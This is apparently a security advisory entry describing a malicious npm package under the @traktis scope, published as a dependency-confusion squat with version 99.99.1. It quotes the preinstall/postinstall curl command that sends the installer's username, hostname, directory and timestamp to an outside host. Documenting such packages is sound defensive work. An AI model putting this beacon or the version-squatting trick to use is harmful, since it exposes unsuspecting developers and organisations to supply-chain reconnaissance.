summary: Dependency-confusion beacon exfiltrates installer identity to http://tko.amgsec.com on npm install
details: package.json declares both preinstall and postinstall scripts that run `curl -s "http://tko.amgsec.com/depconf/traktis-environment/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)"`, sending the installer's username, hostname, current working directory, and timestamp to a hardcoded third-party host over cleartext HTTP on every `npm install`. The shipped index.js is a placeholder stub with no functionality, the author is `anonymous`, and the version is 99.99.1 under the `@traktis` scope — the canonical dependency-confusion shape where an implausibly high version is published to a public scope to override an internal package during resolution, and the sole payload is an install-time reconnaissance beacon that identifies which organizations have resolved the squat.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
